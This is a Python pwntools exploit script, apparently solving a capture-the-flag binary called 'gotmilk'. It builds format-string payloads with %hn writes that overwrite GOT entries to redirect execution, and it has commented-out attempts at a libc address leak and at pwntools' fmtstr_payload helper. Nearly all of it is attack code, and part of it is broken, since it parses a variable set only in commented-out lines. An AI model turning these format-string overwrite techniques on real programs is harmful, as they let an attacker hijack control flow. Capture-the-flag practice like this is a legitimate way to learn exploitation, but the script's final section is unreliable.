from pwn import *

p = process('./gotmilk')
l = ELF('./libmylib.so')

# main = 0x080485f6
# p.recvuntil('?')
# p.sendline('%p %p')
# print p.recvall()
# p = process('./gotmilk')
# p.recvuntil('?')
# # p.sendline('%p %p')
# # print p.recvall()
# # payload += <target address 1 (higher address)><target address 2 (lower address)>
# val1 = int("85f6", 16)
# payload = p32(0x8048480)
# payload += "%" + str( - 4) + "x"
# payload += "%8$hn"
# # payload += %<value to write to 2 - # bytes written (to stack and address 1 padding)>x


def pad(s):
    return s + 'X'*(99-len(s))


afterladdr = 0x0804867e


allower = afterladdr & 0xFFFF
alupper = (afterladdr >> 16) & 0xFFFF

#win_addr_lower = winaddr & 0xFFFF
#win_addr_upper = (winaddr >> 16) & 0xFFFF

print 'afterladdr', hex(afterladdr)
print hex(allower)
print hex(alupper)

offset_1 = (alupper - 31)
offset_2 = (allower - alupper - 13)

# for offset in range(32,50):
lose_addr = p32(0x804a010)
lose_addr_2 = p32(0x804a012)

payload = list("_" * 99)
payload[0:4] = lose_addr_2
payload[4:8] = lose_addr
payload[8:15] = "%" + str(offset_1) + "d"
payload[15:21] = "|%8$s|"
#payload[21:25] = "%8$s"
payload[25:30] = "%7$hn"
payload[35:42] = "%" + str(offset_2) + "d"
payload[50:55] = "%8$hn"
payload = ''.join(payload)
print 'sending', payload

# raw_input("Checkpoint!")

fp = open('payload', 'w')
fp.write(payload)

p.recvuntil('GOT milk? ')
p.send(payload + "\n")

# val1 = int("867e", 16)
# val2 = int("804", 16)
# payload = ""
# payload += p32(0x804a012)
# payload += p32(0x804a010)
# payload += "%" + str(val2 - 31) + "d"
# payload += "|%8$s|" + 'A'*4
# payload += "%7$hn" + 'B'*5
# payload += "%" + str(val1 - val2 - 13) + "d" + 'C'*8
# payload += "%8$hn"
# print len(payload)

# # gdb.attach(p)
# # raw_input("fsdfazrfg")
# p.sendline(pad(payload))
# print p.recvall()
# info = p.recvuntil("?")
p.interactive()
# p.sendline("A"*6 + "%15$x".rjust(4) + "B"*5 + p32(0x8048480)  )
# info = p.recvuntil("?")
# print p.recvall()
# info = p.recv()
print info

libc_fgets = info.split("A")[6].split("B")[0]

print libc_fgets

# print bytes(libc_fgets)
# libc_fgets = u32(libc_fgets)
# print libc_fgets

libc_fgets = int(libc_fgets, 16)

libc_start = libc_fgets - l.symbols['lose']

libc_win = libc_start + l.symbols['win']

print libc_win

h_libc_win = str(hex(libc_win))
val1 = int(h_libc_win[:6], 16)
val2 = int(h_libc_win[6:], 16)

# print h_libc_win
# print h_libc_win[:6]
# payload = ""
# payload += p32(0x804a010)
# payload += p32(0x804a012)
# payload += "%11$" + str(val2 - 8) + "x"
# payload += "%13$" + "x"
# payload += "%13$hn"
# payload += "%" + str(val1 - val2) + "x"
# payload += "%14$hn"
# p.sendline(payload)
# # p.interactive()
# print p.recvuntil('?')
# Function called in order to send a payload
# def send_payload(payload):
#     log.info("payload = %s" % repr(payload))
#     p.sendline(payload)
#     print p.recv()
#     # return p.recv()

# format_string = FmtStr(execute_fmt=send_payload)
# format_string.write(0x8048480, 0x80485f6) # write 0x1337babe at 0x0
# # format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
# format_string.execute_writes()
# we want to do 3 writes
# writes = {0x804a010: 0x804866f}

# the printf() call already writes some bytes
# for example :
# strcat(dest, "blabla :", 256);
# strcat(dest, your_input, 256);
# printf(dest);
# Here, numbwritten parameter must be 8
# payload = fmtstr_payload(7, writes, numbwritten=3)
# context.clear(arch='i386')
# print repr(fmtstr_payload(1, writes, write_size='byte'))
# gdb.attach(p)
# p.sendline(payload)
# raw_input(' stop ')
# p.interactive()
